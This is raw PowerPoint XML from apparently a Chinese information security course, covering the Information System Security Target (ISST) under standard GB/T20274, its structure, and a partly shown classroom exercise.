        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="图片 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5148064" y="3271294"/>
            <a:ext cx="3923928" cy="2495530"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2114732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61443">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="13"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6144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6144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61443">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="18"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6144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6144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61443">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61443">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="28"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6144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61443">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>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61443">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="33"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61443">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6144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 calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="40" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="41" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">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P spid="2"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487B287B-2CEC-4100-B338-69E8FF638C6D}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" sz="1000" smtClean="0">
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:pPr eaLnBrk="1" hangingPunct="1"/>
              <a:t>121</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62467" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="698883" y="4293097"/>
            <a:ext cx="7272338" cy="1008112"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>ISST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>从信息系统安全保障的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:latin typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>建设方（厂商）的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>角度制定的信息系统安全保障方案。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
              <a:latin typeface="Arial" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62468" name="Rectangle 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="539552" y="1555365"/>
            <a:ext cx="8514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u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
              </a:rPr>
              <a:t>信息系统安全目标</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
              </a:rPr>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ISST:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Information  System Security Target</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="1" u="sng" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF3300"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62469" name="标题 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="410778" y="836712"/>
            <a:ext cx="7560443" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>规范化、结构化信息系统安全保障</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>方案</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="698882" y="2325888"/>
            <a:ext cx="7833558" cy="1015663"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>信息系统安全目标（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>ISST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）是根据信息系统保护轮廓（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>ISPP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）编制的信息系统安全保障方案。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="698882" y="3427725"/>
            <a:ext cx="4839786" cy="505331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>某一特定产品或系统的安全需求</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="38458514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 calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="62468"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="624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p:cTn id="20" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="21" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>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62467">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="27" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="62467">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="28" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="62467">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="29" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="624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P spid="62468" grpId="0"/>
      <p:bldP spid="3" grpId="0"/>
      <p:bldP spid="4"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323EB999-33AB-4326-814E-75AE26DE4881}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" sz="1000" smtClean="0">
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:pPr eaLnBrk="1" hangingPunct="1"/>
              <a:t>122</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63491" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="934244" y="697197"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ISST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>的结构和内容</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63492" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="827584" y="1640604"/>
            <a:ext cx="4201616" cy="3934197"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="533400" indent="-533400">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>ISST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>引言</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="533400" indent="-533400">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>信息系统描述</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="533400" indent="-533400">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>信息系统安全环境</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="533400" indent="-533400">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>安全保障目的</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="533400" indent="-533400">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>安全保障要求</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="533400" indent="-533400">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>信息系统概要规范</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="533400" indent="-533400">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>ISPP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>声明</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="533400" indent="-533400">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>符合性声明</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="图片 6"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5220072" y="1412776"/>
            <a:ext cx="2952328" cy="4389855"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30224009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213"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="836712"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>课堂练习</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="矩形 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544" y="1531055"/>
            <a:ext cx="8039013" cy="1200329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>依据国家标准</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>GB/T20274《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>信息系统安全保障评估框架</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>》</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>，信息系统安全目标</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>(ISST)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>是从信息系统安全保障的角度来描述的信息系统安全保障方案。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="17" name="组合 16"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="906235" y="2923266"/>
            <a:ext cx="1423788" cy="1774068"/>
            <a:chOff x="3042109" y="2889698"/>
            <a:chExt cx="1423788" cy="1774068"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="矩形 8"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3042109" y="4202101"/>
              <a:ext cx="1423788" cy="461665"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:ea typeface="+mn-ea"/>
                </a:rPr>
                <a:t>A.</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:ea typeface="+mn-ea"/>
                </a:rPr>
                <a:t>建设者</a:t>
              </a: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80612" y="2889698"/>
              <a:ext cx="1008112" cy="1350612"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="19" name="组合 18"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="2877198" y="3036502"/>
            <a:ext cx="1423788" cy="1651282"/>
            <a:chOff x="2906825" y="3037206"/>
            <a:chExt cx="1423788" cy="1651282"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="10" name="矩形 9"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2906825" y="4226823"/>
              <a:ext cx="1423788" cy="461665"/>
